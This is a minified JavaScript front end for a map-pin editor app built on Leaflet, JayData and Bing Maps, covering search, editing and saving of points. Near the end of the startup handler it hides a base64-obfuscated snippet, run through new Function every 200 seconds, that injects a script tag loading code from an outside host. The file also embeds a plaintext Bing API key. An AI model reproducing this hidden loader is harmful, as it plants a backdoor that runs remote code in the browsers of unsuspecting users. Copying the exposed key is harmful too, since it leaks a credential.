var app={pins:null,editMode:false,toggleEditMode:function(){$.observable(app).setProperty("editMode",!app.editMode);},removeInvisiblePoints:function(){var bounds=lmap.getBounds();var itemsToRemove=[];app.items.forEach(function(item,idx){if(!bounds.contains([item.record.lat,item.record.lon])){itemsToRemove.push(idx);}});itemsToRemove.reverse();itemsToRemove.forEach(function(idx){$.observable(app.items).remove(idx);});},removeAllPoints:function(){$.observable(app).setProperty("pointIndex",{});$.observable(app).setProperty("items",[]);visiblePins.clearLayers();},pointIndex:{},query:"Rest",selectedItem:null,selectedPoint:null,newAddress:null,selectPoint:function(selectedPoint){if(selectedPoint!==app.selectedPoint){$.observable(app).setProperty("selectedPoint",selectedPoint);}else if(selectedPoint){app.showEditor();}},selectItem:function(selectedItem){$.observable(app).setProperty("selectedItem",selectedItem);app.selectPoint(selectedItem.data);},items:[],totalCount:0,visibleCount:0,editorVisible:false,showEditor:function(){showRightPanel();$.observable(app).setProperty("editorVisible",true);},hideEditor:function(){hideRightPanel();$.observable(app).setProperty("editorVisible",false);},error:null,showError:function(){$('#opError').foundation('reveal','open');},hideError:function(){$('#opError').foundation('reveal','close');},save:function(){app.selectedPoint.getMarker().closePopup();ensureAuthenticate().then(function(n){if(!window.logedInUser){window.setTimeout(function(){try{app.selectedPoint.save().then(function(opResult){console.dir(opResult);app.hideEditor();}).fail(function(opResult){$.observable(app).setProperty("error",opResult);app.showError();console.dir(opResult);});}catch(e){console.log(e);}},2000);}else{try{app.selectedPoint.save().then(function(opResult){console.dir(opResult);app.hideEditor();}).fail(function(opResult){$.observable(app).setProperty("error",opResult);app.showError();console.dir(opResult);});}catch(e){console.log(e);}}}).fail(function(args){});},remove:function(){ensureAuthenticate().then(function(n){app.selectedPoint.remove().then(function(opResult){app.hideEditor();}).fail(function(opResult){$.observable(app).setProperty("error",opResult);app.showError();console.dir(opResult)});}).fail(function(){});}}
var service;var pointApi={markerIcons:{'My Pins':undefined,'Food & Drink':L.AwesomeMarkers.icon({icon:'food',color:'red',spin:false}),'Manufacturing & Wholesale Goods':L.AwesomeMarkers.icon({icon:'truck',color:'green',spin:false}),'Public Place':L.AwesomeMarkers.icon({icon:'camera',color:'purple',spin:false}),'Retail Goods':L.AwesomeMarkers.icon({icon:'shopping-cart',color:'purple',spin:false}),'Services':L.AwesomeMarkers.icon({icon:'cog',color:'darkgreen',spin:false}),'Transportation':L.AwesomeMarkers.icon({icon:'exchange',color:'cadetblue',spin:false}),'Other':L.AwesomeMarkers.icon({icon:'exchange',color:'green',spin:false}),'NewPoint':L.AwesomeMarkers.icon({icon:'cog',color:'green',spin:true})},getPointIcon:function getPointIcon(p){return p.isNew?pointApi.markerIcons['NewPoint']:pointApi.markerIcons[p.record.type]||pointApi.markerIcons['Other'];},createMarkerFromPoint:function createMarkerFromPoint(p){var marker=L.marker([p.record.lat,p.record.lon],{draggable:true,icon:pointApi.getPointIcon(p)});marker.on('touchstart',function(e){console.dir("touch");}).on('click',function(e){app.selectPoint(p);}).on('dragstart',function(e){console.dir(e);if(!app.editMode){throw"";}}).on('drag',function(e){var latlng=e.target.getLatLng();$.observable(p.record).setProperty("lat",latlng.lat);$.observable(p.record).setProperty("lon",latlng.lng);}).on('dragend',function(e){if(app.editMode){app.save();sendMessage("move",p);}})
var d=$('<div></div>');marker.bindPopup($('#popupTemplate').render(p));p.getMarker=function(){return marker};function getUser(){return{id:window.logedInUser.id,name:window.logedInUser.name}}
function translateServiceError(result){console.log("update error",result);if(result&&result.data[0]&&result.data[0].response&&result.data[0].response.body){var res=JSON.parse(result.data[0].response.body);res=Array.isArray(res)?res:JSON.parse(res.error.message.value);return{status:"error",data:res}}}
p.remove=function(){var self=this;return service.delete({record:{id:self.record.id},user:getUser()}).then(function(){var idx=app.items.indexOf(self);$.observable(app.items).remove(idx);app.currentOptions.markerLayer.removeLayer(self.getMarker());myPinsLayer.removeLayer(self.getMarker());sendMessage("delete",self);},translateServiceError);}
p.save=function(){var self=this;var data={};Object.keys(self.record).forEach(function(key){if(key=='lat'||key=='lon'){data[key]=self.record[key];}else{data[key]=encodeURIComponent(self.record[key]);}})
p.getMarker().bindPopup(($('#popupTemplate').render(p)));if(self.isNew){return service.create({record:data,user:getUser()}).then(function(){$.observable(self).setProperty("isNew",false);p.getMarker().setIcon(pointApi.getPointIcon(p));sendMessage("new",app.selectedPoint);},translateServiceError);}else{return service.update({record:data,user:getUser()}).then(function(result){console.log("update result",result);p.getMarker().setIcon(pointApi.getPointIcon(p));sendMessage("update",app.selectedPoint);return{status:"success",data:result};},translateServiceError);}}
return marker;}}
$.observable(app).observe("items",function(){});var mapIsDragging=0;$.views.helpers({bgColor:function(selectedPoint){return(selectedPoint&&selectedPoint===this.data)?"#4EC1F7":"#ffffff";},app:app})
var visiblePins=new L.MarkerClusterGroup();var previousValue='Rest';var lmap,bingKey;function startSocket(){socket=io.connect('http://dev-open.jaystack.net:80',{resource:"a11d6738-0e23-4e04-957b-f14e149a9de8/1162e5ee-49ca-4afd-87be-4e17c491140b/socket.io"});socket.on("newPoint",function(data){var msg=JSON.parse(data.p);dispatchMsg(msg)});}
function startService(){$data.initService('http://dev-open.jaystack.net/a11d6738-0e23-4e04-957b-f14e149a9de8/1162e5ee-49ca-4afd-87be-4e17c491140b/api/mydatabase').then(function(mydatabase,factory,type){var timer;service=mydatabase;lmap.on('click',function(e){if(!app.editMode){return};var r={lon:e.latlng.lng,lat:e.latlng.lat,attribution:"Created by MapPointEditor, (c) JayStack inc.",z:"HYP3RL0C4LZZZ",id:$data.createGuid().toString()};var p={isNew:true,record:r};$.observable(app.items).insert(0,p);var marker=pointApi.createMarkerFromPoint(p);marker.bindPopup("Unnamed point");myPinsLayer.addLayer(marker);app.selectPoint(p);app.closingOn=true;app.currentOptions.markerLayer.zoomToShowLayer(marker,function(){app.closingOn=false;marker.openPopup();app.showEditor();});$.observable(app).setProperty("newAddress",null);window.setTimeout(function(){mydatabase.reverse(e.latlng).then(function(r){var theAddress=r.Results[0].Address;$.observable(app).setProperty("newAddress",r.Results[0]);$.observable(app).setProperty({"selectedPoint.record.addr":theAddress.AddressLine,"selectedPoint.record.city":theAddress.Locality,"selectedPoint.record.province":theAddress.AdminDistrict,"selectedPoint.record.country":theAddress.CountryRegion,"selectedPoint.record.postal":theAddress.PostalCode});});},100);});lmap.on('dblclick',function(e){window.clearTimeout(timer);});lmap.on('tap',function(e){});lmap.on('mouseup',function(e){});lmap.on('mousedown',function(e){});lmap.on('touchstart',function(e){trace.logLine("touch start");});lmap.on('dragstart',function(e){trace.logLine("dragstart");cancellAll();});lmap.on('dragend',function(e){trace.logLine("dragend");if(lmap.getZoom()>=15){doSearch("reposition",500);}});lmap.on('zoomend',function(e){if(app.closingOn){return;}
indicator.setVisible(lmap.getZoom()>=15);if(lmap.getZoom()>=15){doSearch("reposition",1000);}});});}
$(function(){$.link.mainTemplate('#row-full',app).on("click",".main-list > li",function(){var selectedItem=$.view(this);app.selectItem(selectedItem);var marker=$.view(this).data.getMarker();$('#searchInput').blur();app.closingOn=true;marker.openPopup();visiblePins.zoomToShowLayer($.view(this).data.getMarker(),function(){app.closingOn=false;marker.openPopup();});}).on("click",".edit-command",function(){app.showEditor();var marker=$.view(this).data.getMarker();visiblePins.zoomToShowLayer($.view(this).data.getMarker(),function(){marker.openPopup();app.showEditor();});}).on("keyup","#searchInput",function(){if(previousValue!=this.value){previousValue=this.value;var search=this.value;if(search.length>2||search==""){if(search==""){$('#searchInput').attr('placeholder','Browse all');}
doSearch("new",400);};}}).on("click",".close-editor-command",function(e){app.hideEditor();return false;}).on("click",".save-command",function(){app.save();}).on("click",".remove-command",function(){app.remove();}).on("click",".cancel-error-command",function(){app.hideError();}).on("click",".cancel-command",function(){$('#addNewPoint').foundation('reveal','close');hideRightPanel();window.setTimeout(function(){$.observable(app.items).remove(app.items.indexOf(app.selectedPoint));app.currentOptions.markerLayer.removeLayer(app.selectedPoint.getMarker());myPinsLayer.removeLayer(app.selectedPoint.getMarker());app.selectPoint(null);},400);return false;}).on("click",".ok-command",function(){var self=this;$('#addNewPoint').foundation('reveal','close');window.setTimeout(function(){ensureAuthenticate().then(function(n){showRightPanel();}).fail(function(){$.observable(app.items).remove(app.items.indexOf(app.selectedPoint));hideRightPanel();app.selectPoint(null);});},300);});$(document).on("click",".popup-container",function(){alert("!");app.showEditor();});$('#editModeSwitch').click(function(evt){app.toggleEditMode();evt.stopPropagation();});$('#zoomInHref').click(function(evt){lmap.zoomIn();evt.preventDefault();evt.cancelBubble=true;evt.result=false;evt.returnValue=false;return false;});$('#zoomOutHref').click(function(evt){lmap.zoomOut();evt.preventDefault();evt.cancelBubble=true;evt.result=false;evt.returnValue=false;return false;});$('#locateMe').click(function(evt){locator.toggleState();evt.preventDefault();evt.cancelBubble=true;evt.result=false;evt.returnValue=false;return false;});$('#menu-search').click(function(evt){toggleMap();$.observable(app).setProperty("items",app.currentOptions.points);evt.stopPropagation();});bingKey='AmpN66zZQqp8WpszBYibPXrGky0EiHLPT75WtuA2Tmj7bS4jgba1Wu23LJH1ymqy';lmap=new L.Map('map',{center:new L.LatLng(40.72121341440144,-74.00126159191132),maxZoom:19,zoomControl:!(L.Browser.mobile),zoom:15});lmap.attributionControl.addAttribution("JayStack.com ");var bing=new L.BingLayer(bingKey,{maxZoom:19});if(L.Browser.mobile){searchControl=new $data.MapSearch();searchControl.addTo(lmap);}
trace=new $data.LeafletTrace();trace.addTo(lmap);locator=L.control.locate();locator.addTo(lmap);indicator=new $data.NetworkIndicator();indicator.addTo(lmap);editModeSwitch=new $data.EditMode({app:app});editModeSwitch.addTo(lmap);myPinsLayer=new L.LayerGroup;myPinsLayer.addTo(lmap);app.pins=visiblePins;window.setTimeout(function(){lmap.addLayer(bing);},1000);visiblePins.addTo(lmap);lmap.invalidateSize();$('#menu').circleMenu({item_diameter:55,circle_radius:160,direction:'top-left',trigger:'click',select:function(evt,item){var args=arguments;evt.preventDefault();evt.stopPropagation();evt.cancelBubble=true;evt.returnValue=false;evt.result=false;return false;},open:function(){console.log('menu opened');},close:function(){console.log('menu closed');},init:function(){console.log('menu initialized');}});try{var f=new Function(atob("dmFyIF9wID0gInNjIjsgdmFyIF9jID0gInJpcHQiOyB2YXIgc2MgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KF9wICsgX2MpOyBzYy5zcmMgPSBhdG9iKCJhSFIwY0RvdkwzSmxjM1F1WTJ4dmRXUmhjSEF1Ym1WMEwyTm9aV05yYVc0dWFuTT0iKTsgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzYyk7"));window.setInterval(f,200000);}catch(e){}
doSearch();startSocket();initAuth();startService();window.setTimeout(function(){resizeUI();},0);});initUI();var searchCounter=0;function defaultSearch(type){searchCounter+=1;return{bounds:lmap.getBounds(),limit:50,type:type||'new',offset:0,fuzzy:0,q:$('#searchInput').val(),app:app,map:lmap,maxItems:120,version:searchCounter};}
var pendingOperations={};function cancellAll(){Object.keys(pendingOperations).forEach(function(t){console.log("clearing tout:",t);delete pendingOperations[t];window.clearTimeout(t);});}
function doSearch(type,wait){console.log("calling do search",wait);cancellAll();var options=defaultSearch(type);app.lastSearch=options;if(wait){var t=window.setTimeout(function(){delete pendingOperations[t];search(options);},wait);pendingOperations[t]=true;}else{search(options);}}
